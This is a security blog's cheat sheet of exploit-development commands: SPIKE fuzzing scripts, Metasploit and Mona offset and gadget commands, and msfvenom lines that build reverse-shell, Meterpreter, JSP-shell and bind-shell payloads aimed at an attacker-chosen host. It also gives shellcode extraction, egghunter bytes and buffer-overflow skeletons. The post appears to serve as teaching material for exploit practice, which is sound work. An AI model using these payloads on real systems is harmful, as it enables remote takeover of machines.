<!DOCTYPE html>
<html lang="en-us">

  <head>
  <link href="http://gmpg.org/xfn/11" rel="profile">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">

  <!-- Enable responsiveness on mobile devices-->
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

  <title>
    
      Greycel &middot; Another Security Blog
    
  </title>

  <!-- CSS -->
  <link rel="stylesheet" href="/public/css/poole.css">
  <link rel="stylesheet" href="/public/css/syntax.css">
  <link rel="stylesheet" href="/public/css/lanyon.css">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Serif:400,400italic,700%7CPT+Sans:400">

  <!-- Icons -->
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/public/apple-touch-icon-precomposed.png">
  <link rel="shortcut icon" href="/public/favicon.ico">

  <!-- RSS -->
  <link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">
</head>


  <body class="theme-base-08 layout-reverse sidebar-overlay">

    <!-- Target for toggling the sidebar `.sidebar-checkbox` is for regular
     styles, `#sidebar-checkbox` for behavior. -->
<input type="checkbox" class="sidebar-checkbox" id="sidebar-checkbox">

<!-- Toggleable sidebar -->
<div class="sidebar" id="sidebar">
  <div class="sidebar-item">
    <p>Keep Learning..</p>
  </div>

  <nav class="sidebar-nav">
    <a class="sidebar-nav-item" href="/">Home</a>

    

    
    
      
        
      
    
      
        
      
    
      
        
          <a class="sidebar-nav-item" href="/about/">About</a>
        
      
    
      
        
          <a class="sidebar-nav-item" href="/archive/">Archive</a>
        
      
    
      
    
      
        
      
    


<!--    <a class="sidebar-nav-item" href="/archive/v.zip">Archive/a> 
    <a class="sidebar-nav-item" href="">GitHub project</a> -->
  </nav>

  <div class="sidebar-item">
    <p>
      &copy; 2017. All rights reserved.
    </p>
  </div>
</div>


    <!-- Wrap is the content to shift when toggling the sidebar. We wrap the
         content to avoid any CSS collisions with our real content. -->
    <div class="wrap">
      <div class="masthead">
        <div class="container">
          <h3 class="masthead-title">
            <a href="/" title="Home">Greycel</a>
            <small>Another Security Blog</small>
          </h3>
        </div>
      </div>

      <div class="container content">
        <div class="posts">
  
  <div class="post">
    <h1 class="post-title">
      <a href="/2017/04/15/Handy-Commands-ExpDev/">
        Handy Commands for Exploit Development
      </a>
    </h1>

    <span class="post-date">15 Apr 2017</span>

    <div class="message"> 
Handy Tools and Commands useful during Exploit Development.
</div>

<h3 id="fuzzing-with-spike">Fuzzing with SPIKE</h3>

<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="c1"># As per given script file, it sends data to the Target-Server over TCP-Port</span>
<span class="p">.</span><span class="nf">/</span><span class="n">generic_send_tcp</span> <span class="o">&lt;</span><span class="no">Target</span><span class="o">-</span><span class="no">IP</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="no">Target</span><span class="o">-</span><span class="no">Port</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">my</span><span class="o">-</span><span class="n">script</span><span class="o">-</span><span class="n">file</span><span class="p">.</span><span class="nf">spk</span><span class="o">&gt;</span> <span class="mi">0</span> <span class="mi">0</span>

<span class="c1"># As per given script file, it sends data to the Target-Server over UDP-Port</span>
<span class="p">.</span><span class="nf">/</span><span class="n">gsu</span> <span class="o">&lt;</span><span class="no">Target</span><span class="o">-</span><span class="no">IP</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="no">Target</span><span class="o">-</span><span class="no">Port</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">my</span><span class="o">-</span><span class="n">script</span><span class="o">-</span><span class="n">file</span><span class="p">.</span><span class="nf">spk</span><span class="o">&gt;</span> <span class="mi">0</span> <span class="mi">0</span> <span class="mi">5000</span></code></pre></figure>

<blockquote>
  <p>Below is a sample script file which initially waits for one second then starts reading the lines sent by the server and sends “LOGIN user passwd” to server and again reads the reply from server.</p>
</blockquote>

<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="n">s_sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>			<span class="c1">#sleep for a second</span>
<span class="n">s_readline</span><span class="p">();</span>			<span class="c1">#read lines from the server		</span>
<span class="n">s_string</span><span class="p">(</span><span class="s2">"LOGIN"</span><span class="p">);</span>		<span class="c1">#send "Login" command</span>
<span class="n">s_string</span><span class="p">(</span><span class="s2">" "</span><span class="p">);</span>
<span class="n">s_string_variable</span><span class="p">(</span><span class="s2">"user"</span><span class="p">);</span>	<span class="c1">#set "user" as first fuzz point</span>
<span class="n">s_string</span><span class="p">(</span><span class="s2">" "</span><span class="p">);</span>
<span class="n">s_string_variable</span><span class="p">(</span><span class="s2">"passwd"</span><span class="p">);</span>	<span class="c1">#set "passwd" as next fuzz point</span>
<span class="n">s_string</span><span class="p">(</span><span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">)</span>
<span class="n">s_readline</span><span class="p">();</span></code></pre></figure>

<blockquote>
  <p>Having the application/service attached to a debugger check if the application crashes anywhere and if it does, then identify things like Crash Point, Registers you can control, Total Buffer length.</p>
</blockquote>

<hr />

<h3 id="find-offset-using-metasploit">Find offset using Metasploit</h3>

<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="n">cd</span> <span class="sr">/usr/s</span><span class="n">hare</span><span class="o">/</span><span class="n">metasploit</span><span class="o">-</span><span class="n">framework</span><span class="o">/</span><span class="n">tools</span><span class="o">/</span>

<span class="c1"># Creates a unique patttern of length 2000</span>
<span class="p">.</span><span class="nf">/</span><span class="n">pattern_create</span> <span class="o">-</span><span class="n">l</span> <span class="mi">2000</span>

<span class="c1"># Find the offset which has overwritten the required registers</span>
<span class="p">.</span><span class="nf">/</span><span class="n">pattern_offset</span> <span class="o">-</span><span class="n">q</span> <span class="no">PATTERN</span></code></pre></figure>

<hr />

<h3 id="handy-mona-commands-while-debugging">Handy Mona Commands while debugging</h3>

<blockquote>
  <p>Download mona from <a href="https://github.com/corelan/mona"> corelan </a> and place “mona.py” file in “PyCommands” folder of immunity debugger.</p>
</blockquote>

<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="c1"># set mona working folder</span>
<span class="o">!</span><span class="n">mona</span> <span class="n">config</span> <span class="o">-</span><span class="n">set</span> <span class="n">workingfolder</span> <span class="n">c</span><span class="p">:\</span><span class="n">logs</span><span class="p">\</span><span class="o">%</span><span class="nb">p</span>  

<span class="c1"># Generate unique pattern of 20000 where pc(pattern_create)</span>
<span class="o">!</span><span class="n">mona</span> <span class="n">pc</span> <span class="mi">20000</span>

<span class="c1"># Finds the offset of unique or cyclic pattern in memory</span>
<span class="o">!</span><span class="n">mona</span> <span class="n">findmsp</span> 

<span class="c1"># Finds the offset of 4bytes within the pattern where po(pattern_offset)</span>
<span class="o">!</span><span class="n">mona</span> <span class="n">po</span> <span class="o">&lt;</span><span class="n">overwritten</span><span class="o">-</span><span class="n">bytes</span><span class="o">&gt;</span>

<span class="c1"># Find instructions with jump to esp like jmp esp, call esp etc.</span>
<span class="o">!</span><span class="n">mona</span> <span class="n">jmp</span> <span class="o">-</span><span class="n">r</span> <span class="n">esp</span> 

<span class="c1"># Create bytearray from '00' to 'ff', used for bad character analysis</span>
<span class="o">!</span><span class="n">mona</span> <span class="n">bytearray</span> 

<span class="c1">#Generate bytearray without bad bytes "\x00\x0a\x0d"</span>
<span class="o">!</span><span class="n">mona</span> <span class="n">bytearray</span> <span class="o">-</span><span class="n">b</span> <span class="s2">"</span><span class="se">\x00\x0a\x0d</span><span class="s2">"</span> 

<span class="c1"># Generates rop gadgets from the selected Modules</span>
<span class="o">!</span><span class="n">mona</span> <span class="n">rop</span> <span class="o">-</span><span class="n">m</span> <span class="s2">"kerner32,user32"</span>

<span class="c1"># Gives you pop pop ret to get to nseh</span>
<span class="o">!</span><span class="n">mona</span> <span class="n">seh</span> 

<span class="c1"># Analyze bytes from 001254c1</span>
<span class="o">!</span><span class="n">mona</span> <span class="n">compare</span> <span class="o">-</span><span class="n">f</span> <span class="no">C</span><span class="p">:\</span><span class="n">logs</span><span class="p">\</span><span class="n">something</span><span class="p">\</span><span class="n">bytearray</span><span class="p">.</span><span class="nf">bin</span> <span class="o">-</span><span class="n">a</span> <span class="mo">001254</span><span class="n">c1</span> 

<span class="c1">#Converts given assembly instructions(sparated by "#") into opcode</span>
<span class="o">!</span><span class="n">mona</span> <span class="n">assemble</span> <span class="o">-</span><span class="n">s</span> <span class="s2">"pop eax#push ebx#mov ebp,esp"</span> 

<span class="c1">#Find ASCII string 'w00t' in memory,  type can be 'asc', 'instr'</span>
<span class="o">!</span><span class="n">mona</span> <span class="n">find</span> <span class="o">-</span><span class="n">type</span> <span class="n">asc</span> <span class="o">-</span><span class="n">s</span> <span class="s2">"w00t"</span>  

<span class="c1">#Update mona</span>
<span class="o">!</span><span class="n">mona</span> <span class="n">update</span></code></pre></figure>

<!--###### <a href="https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/"> more commands @ corelan</a> -->
<hr />

<p>Payload Generation with MSFvenom</p>

<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="n">msfvenom</span> <span class="o">-</span><span class="n">l</span> <span class="n">payloads</span>
<span class="n">msfvenom</span> <span class="o">--</span><span class="n">help</span><span class="o">-</span><span class="n">formats</span>

<span class="n">msfvenom</span> <span class="o">-</span><span class="n">a</span> <span class="n">x86</span> <span class="o">--</span><span class="n">platform</span> <span class="no">Windows</span> <span class="o">-</span><span class="nb">p</span> <span class="n">windows</span><span class="o">/</span><span class="n">shell_reverse_tcp</span> <span class="no">LHOST</span><span class="o">=&lt;</span><span class="no">UR</span> <span class="no">IP</span><span class="o">&gt;</span> <span class="no">LPORT</span><span class="o">=&lt;</span><span class="no">PORT</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">e</span> <span class="n">x86</span><span class="o">/</span><span class="n">shikata_ga_nai</span> <span class="o">-</span><span class="n">b</span> <span class="s1">'\x00\x0a\x0d'</span> <span class="o">-</span><span class="n">i</span> <span class="mi">2</span> <span class="o">-</span><span class="n">f</span> <span class="n">python</span>

<span class="n">msfvenom</span> <span class="o">-</span><span class="nb">p</span> <span class="n">windows</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span> <span class="no">LHOST</span><span class="o">=&lt;</span><span class="no">UR</span> <span class="no">IP</span><span class="o">&gt;</span> <span class="no">LPORT</span><span class="o">=&lt;</span><span class="no">PORT</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">e</span> <span class="n">x86</span><span class="o">/</span><span class="n">shikata_ga_nai</span>  <span class="o">-</span><span class="n">b</span> <span class="s1">'\x00\x0a\x0d'</span> <span class="o">-</span><span class="n">f</span> <span class="n">exe</span> <span class="o">-</span><span class="n">o</span> <span class="n">myshell</span><span class="p">.</span><span class="nf">exe</span>

<span class="n">msfvenom</span> <span class="o">-</span><span class="nb">p</span> <span class="n">java</span><span class="o">/</span><span class="n">jsp_shell_reverse_tcp</span> <span class="no">LHOST</span><span class="o">=&lt;</span><span class="no">UR</span> <span class="no">IP</span><span class="o">&gt;</span> <span class="no">LPORT</span><span class="o">=&lt;</span><span class="no">Port</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">f</span> <span class="n">raw</span> <span class="o">&gt;</span> <span class="n">jspshell</span><span class="p">.</span><span class="nf">jsp</span>

<span class="n">msfvenom</span> <span class="o">-</span><span class="nb">p</span> <span class="n">java</span><span class="o">/</span><span class="n">jsp_shell_reverse_tcp</span> <span class="no">LHOST</span><span class="o">=&lt;</span><span class="no">UR</span> <span class="no">IP</span><span class="o">&gt;</span> <span class="no">LPORT</span><span class="o">=&lt;</span><span class="no">Port</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">f</span> <span class="n">war</span> <span class="o">&gt;</span> <span class="n">myshell</span><span class="p">.</span><span class="nf">war</span>

<span class="n">msfvenom</span> <span class="o">-</span><span class="nb">p</span> <span class="n">windows</span><span class="o">/</span><span class="n">shell_bind_tcp</span> <span class="no">LPORT</span><span class="o">=</span><span class="mi">4321</span> <span class="o">-</span><span class="n">e</span> <span class="n">x86</span><span class="o">/</span><span class="n">shikata_ga_nai</span> <span class="o">-</span><span class="n">b</span> <span class="s2">"</span><span class="se">\x00\x0d\x0a</span><span class="s2">"</span> <span class="o">-</span><span class="n">i</span> <span class="mi">3</span> <span class="o">-</span><span class="n">f</span> <span class="n">c</span>

<span class="c1"># where Arch(-a), Platform(- -platform), Payload(-p), encoder(-e),  Encode-Iteration(-i), Bad-chars(-b), Output Format(-f), OutPut-File(-o)</span></code></pre></figure>

<hr />

<p>Compiling &amp; Extract shellcode from a Binary</p>

<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="c1"># Compiles and generates an object file from given nasm file where -f(output format) -o(output file)</span>
<span class="n">nasm</span> <span class="o">-</span><span class="n">f</span> <span class="n">elf32</span> <span class="o">-</span><span class="n">o</span> <span class="n">myobj</span><span class="p">.</span><span class="nf">o</span> <span class="n">myfile</span><span class="p">.</span><span class="nf">nasm</span>

<span class="c1"># use "objdump" to extract the shellcode out from the generated object file "myobj.o"</span>
<span class="n">objdump</span> <span class="o">-</span><span class="n">d</span> <span class="n">myobj</span><span class="p">.</span><span class="nf">o</span><span class="o">|</span><span class="n">grep</span> <span class="s1">'[0-9a-f]:'</span><span class="o">|</span><span class="n">grep</span> <span class="o">-</span><span class="n">v</span> <span class="s1">'file'</span><span class="o">|</span><span class="n">cut</span> <span class="o">-</span><span class="n">f2</span> <span class="o">-</span><span class="n">d</span><span class="ss">:|</span><span class="n">cut</span> <span class="o">-</span><span class="n">f1</span><span class="o">-</span><span class="mi">7</span> <span class="o">-</span><span class="n">d</span><span class="s1">' '</span><span class="o">|</span><span class="n">tr</span> <span class="o">-</span><span class="n">s</span> <span class="s1">' '</span><span class="o">|</span><span class="n">tr</span> <span class="s1">'\t'</span> <span class="s1">' '</span><span class="o">|</span><span class="n">sed</span> <span class="s1">'s/ $//g'</span><span class="o">|</span><span class="n">sed</span> <span class="s1">'s/ /\\x/g'</span><span class="o">|</span><span class="n">paste</span> <span class="o">-</span><span class="n">d</span> <span class="s1">''</span> <span class="o">-</span><span class="n">s</span> <span class="o">|</span><span class="n">sed</span> <span class="s1">'s/^/"/'</span><span class="o">|</span><span class="n">sed</span> <span class="s1">'s/$/"/g'</span></code></pre></figure>

<hr />

<p>EggHunter</p>

<blockquote>
  <p>Basically this will loop through the memory and searches for the string “w00t”(\x77\x30\x30\x74). Once it finds the string or the egg “w00t” one after the other “w00tw00t” in memory, it will break out of the loop and continous to execute the shellcode placed immediatley after “w00tw00t”.</p>
</blockquote>

<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="no">Egg</span> <span class="s2">"w00t"</span> <span class="o">=</span> <span class="s2">"</span><span class="se">\x77\x30\x30\x74</span><span class="s2">"</span> 

<span class="s2">"</span><span class="se">\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8\x77\x30\x30\x74\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7</span><span class="s2">"</span></code></pre></figure>

<hr />

<p>Basic Exploit skeleton</p>

<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="c1"># Stack Based Overflow</span>
<span class="n">buffer</span> <span class="o">=</span> <span class="n">junk</span> <span class="o">+</span> <span class="n">ret</span> <span class="o">+</span> <span class="n">shellcode</span>
<span class="n">buffer</span> <span class="o">=</span> <span class="s2">"A"</span><span class="o">*</span><span class="mi">1340</span> <span class="o">+</span> <span class="s2">"B"</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="s2">"C"</span><span class="o">*</span><span class="mi">378</span>

<span class="c1"># SEH Based Overflow</span>
<span class="n">buffer</span> <span class="o">=</span> <span class="n">junk</span> <span class="o">+</span> <span class="n">nseh</span> <span class="o">+</span> <span class="n">seh</span> <span class="o">+</span> <span class="n">shellcode</span>
<span class="n">buffer</span> <span class="o">=</span> <span class="s2">"A"</span><span class="o">*</span><span class="mi">1500</span> <span class="o">+</span> <span class="s2">"B"</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="s2">"C"</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="s2">"D"</span><span class="o">*</span><span class="mi">554</span></code></pre></figure>

<hr />

<p>ARWIN Utility</p>

<blockquote>
  <p>Handy program capable of extracting the address of a specific functions within a given DLL, utility can be downloaded from <a href="http://www.fuzzysecurity.com/tutorials/expDev/tools/arwin.rar">Fuzz Security</a>.</p>
</blockquote>

<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="c1"># Provides the address of the function within the library</span>
<span class="n">arwin</span> <span class="o">&lt;</span><span class="no">Library</span> <span class="no">Name</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="no">Function</span> <span class="no">Name</span><span class="o">&gt;</span>
<span class="no">Eg</span><span class="p">:</span> <span class="n">arwin</span> <span class="no">Kernel32</span> <span class="no">LoadLibraryA</span></code></pre></figure>

<hr />


  </div>
  
</div>

<div class="pagination">
  
    <span class="pagination-item older">Older</span>
  
  
    
      <a class="pagination-item newer" href="/">Newer</a>
    
  
</div>


      </div>
    </div>

    <label for="sidebar-checkbox" class="sidebar-toggle"></label>

    <script>
      (function(document) {
        var toggle = document.querySelector('.sidebar-toggle');
        var sidebar = document.querySelector('#sidebar');
        var checkbox = document.querySelector('#sidebar-checkbox');

        document.addEventListener('click', function(e) {
          var target = e.target;

          if(!checkbox.checked ||
             sidebar.contains(target) ||
             (target === checkbox || target === toggle)) return;

          checkbox.checked = false;
        }, false);
      })(document);
    </script>
  </body>
</html>
